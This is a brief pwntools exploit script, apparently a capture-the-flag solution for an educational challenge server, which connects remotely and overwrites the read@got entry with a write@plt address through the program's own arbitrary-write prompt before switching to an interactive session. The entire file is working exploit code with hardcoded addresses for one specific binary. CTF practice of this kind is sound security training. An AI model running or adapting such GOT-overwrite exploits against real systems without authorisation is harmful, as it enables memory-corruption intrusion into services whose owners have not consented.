from pwn import *

read_got = 0x404038
write_plt = 0x4012d7

r = remote("edu-ctf.zoolab.org", 30203)

r.sendlineafter("Overwrite addr: ", str(read_got).encode())
r.sendafter("Overwrite 8 bytes value: ", p64(write_plt))

r.interactive()